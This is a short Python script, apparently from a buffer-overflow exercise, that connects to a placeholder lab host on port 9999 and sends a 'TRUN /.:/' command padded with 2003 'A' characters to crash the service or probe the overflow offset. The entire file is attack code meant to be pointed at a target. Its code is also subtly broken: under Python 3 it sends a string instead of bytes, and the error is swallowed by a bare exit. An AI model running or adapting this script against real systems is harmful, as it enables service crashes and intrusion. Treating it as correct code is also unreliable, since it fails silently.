#!/usr/bin/python3
import socket

offset = "A" * 2003

target_ip = "192.168.245.135" # CHANGE THIS
target_port = 9999 # CHANGE THIS

try:

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(("TRUN /.:/" + offset))
    s.close()

except Exception as e:
    #print(e)
    exit()
